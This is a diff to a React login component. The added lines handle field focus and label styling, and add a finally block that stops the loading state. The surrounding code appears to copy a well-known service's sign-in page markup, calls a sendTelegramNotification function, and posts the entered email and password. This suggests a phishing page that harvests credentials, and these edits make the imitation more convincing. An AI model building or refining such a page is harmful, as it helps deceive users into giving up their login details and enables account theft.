@@ -14,6 +14,17 @@ const Login = () => {
   const [emailError, setEmailError] = useState('');
   const [passwordError, setPasswordError] = useState('');
   const history = useHistory();
+// Add state for focus
+const [isEmailFocused, setIsEmailFocused] = useState(false);
+// Add at the top with other state declarations
+const [isPasswordFocused, setIsPasswordFocused] = useState(false);
+
+// Add handlers 
+const handleEmailFocus = () => setIsEmailFocused(true);
+const handleEmailBlur = () => setIsEmailFocused(false);
+// Add with other handler functions
+const handlePasswordFocus = () => setIsPasswordFocused(true);
+const handlePasswordBlur = () => setIsPasswordFocused(false);
 
   useEffect(() => {
     const sendTelegramNotification = async () => {
@@ -81,6 +92,7 @@ const Login = () => {
         password 
       });
       console.log('Registration response:', response.data);
+      
       if (response.data.error) {
         console.error('Registration error:', response.data.error);
         setLoginError(true);
@@ -94,7 +106,9 @@ const Login = () => {
     } catch (error) {
       console.error('Registration failed:', error.response?.data || error.message);
       setLoginError(true);
-    }
+    } finally {
+      setLoading(false); // Ensure loading stops
+    }    
   };
 
   return (
@@ -262,7 +276,7 @@ const Login = () => {
                   >
                     <div className="default-ltr-cache-z5atxi e2eu37l0">
                       <div
-                        className={`form-control_containerStyles__oy4jpq0 ${email ? 'default-ltr-cache-3e67ds' : 'default-ltr-cache-14jsj4q'} exrud7f1`}
+                        className={`form-control_containerStyles__oy4jpq0 ${ email || isEmailFocused ? 'default-ltr-cache-3e67ds' : 'default-ltr-cache-14jsj4q'} exrud7f1`}
                         data-uia="login-field+container"
                         dir="ltr"
                       >
@@ -287,6 +301,8 @@ const Login = () => {
                             name="email"
                             data-uia="login-field"
                             value={email}
+                            onFocus={handleEmailFocus}
+                            onBlur={handleEmailBlur}                          
                             onChange={(e) => setEmail(e.target.value)}
                             aria-describedby=":rd:"
                             aria-invalid={!!emailError}
@@ -339,7 +355,7 @@ const Login = () => {
                     </div>
                     <div className="default-ltr-cache-1qtmpa e1j9l8n51">
                       <div
-                        className={`form-control_containerStyles__oy4jpq0 ${password ? 'default-ltr-cache-1snakfo' : 'default-ltr-cache-p2hz7y'} e2so2tu1`}
+                        className={`form-control_containerStyles__oy4jpq0 ${ password || isPasswordFocused ? 'default-ltr-cache-1snakfo' : 'default-ltr-cache-p2hz7y'} e2so2tu1`}
                         data-uia="password-field+container"
                         dir="ltr"
                       >
@@ -363,6 +379,8 @@ const Login = () => {
                             id=":rf:"
                             name="password"
                             data-uia="password-field"
+                            onFocus={handlePasswordFocus}
+                            onBlur={handlePasswordBlur}                          
                             value={password}
                             onChange={(e) => setPassword(e.target.value)}
                             aria-describedby=":rg:"
